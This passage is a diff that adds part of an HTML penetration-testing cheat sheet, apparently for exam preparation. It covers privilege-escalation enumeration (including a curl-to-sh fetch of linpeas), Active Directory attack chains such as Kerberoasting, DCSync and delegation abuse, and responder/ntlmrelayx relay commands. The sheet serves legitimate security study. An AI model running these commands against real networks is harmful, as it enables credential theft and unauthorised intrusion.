+        <code class="cmd">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code>
+        <code class="cmd">.\winpeas.exe quiet cmd fast</code>
+        <code class="cmd">Import-Module .\PowerUp.ps1; Invoke-AllChecks</code>
+
+        <div class="section-label">Note-Taking Tools</div>
+        <div class="row"><span class="key">Obsidian</span><span class="val">markdown-based, tag by machine</span></div>
+        <div class="row"><span class="key">CherryTree</span><span class="val">hierarchical, built into Kali</span></div>
+        <div class="row"><span class="key">Flameshot</span><span class="val">screenshot tool with annotations</span></div>
+      </div>
+    </div>
+
+    <!-- AD ATTACK PATHS -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#F5F0FF;">&#128279;</div>
+        <h2>AD Attack Paths &amp; Techniques</h2>
+        <span class="sub">delegation · ACL · relay</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Common AD Attack Chains</div>
+        <div class="row"><span class="key">AS-REP Roast</span><span class="val">no pre-auth → hash → crack offline</span></div>
+        <div class="row"><span class="key">Kerberoast</span><span class="val">SPN → TGS → hashcat -m 13100</span></div>
+        <div class="row"><span class="key">Pass-the-Hash</span><span class="val">NTLM hash → lateral movement</span></div>
+        <div class="row"><span class="key">Pass-the-Ticket</span><span class="val">steal TGT → impersonate user</span></div>
+        <div class="row"><span class="key">DCSync</span><span class="val">replicate DC creds → all hashes</span></div>
+        <div class="row"><span class="key">NTLM Relay</span><span class="val">responder + ntlmrelayx to capture</span></div>
+
+        <div class="section-label">Delegation Attacks</div>
+        <div class="row"><span class="key">Unconstrained</span><span class="val">coerce DC auth → get TGT → DCSync</span></div>
+        <div class="row"><span class="key">Constrained</span><span class="val">s4u2self + s4u2proxy → impersonate</span></div>
+        <div class="row"><span class="key">RBCD</span><span class="val">write msDS-AllowedToActOnBehalf</span></div>
+
+        <div class="section-label">BloodHound Key Edges</div>
+        <div class="row"><span class="key">GenericAll</span><span class="val">full control → reset pw, add to group</span></div>
+        <div class="row"><span class="key">WriteDACL</span><span class="val">grant yourself GenericAll</span></div>
+        <div class="row"><span class="key">ForceChangePassword</span><span class="val">reset without old pw</span></div>
+        <div class="row"><span class="key">CanPSRemote</span><span class="val">WinRM access to host</span></div>
+
+        <div class="section-label">NTLM Relay Setup</div>
+        <code class="cmd">responder -I eth0 -dwv</code>
+        <code class="cmd">impacket-ntlmrelayx -tf targets.txt -smb2support</code>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- FOOTER TIP BAR -->
+  <div class="tip-bar">
+    <div>
+      <div class="tip-label">Methodology</div>
+      <div class="tip"><b>Enumerate everything</b> before exploiting. Missing a port = missing a vector.</div>
+    </div>
+    <div>
+      <div class="tip-label">AD Strategy</div>
+      <div class="tip">AD set is <b>40 pts</b> — prioritize it. Partial credit: user shell on client = pts even without DA.</div>
+    </div>
+    <div>
+      <div class="tip-label">Stuck?</div>
+      <div class="tip"><b>Re-enumerate</b> — run linpeas/winpeas again, check new ports, reread gobuster output carefully.</div>
+    </div>
+    <div>
+      <div class="tip-label">Report Quality</div>
+      <div class="tip">Treat report as <b>50% of the work</b>. Write as you go — don't reconstruct from memory after the exam.</div>
+    </div>
+  </div>
+
+</div>
+</body>
+</html>
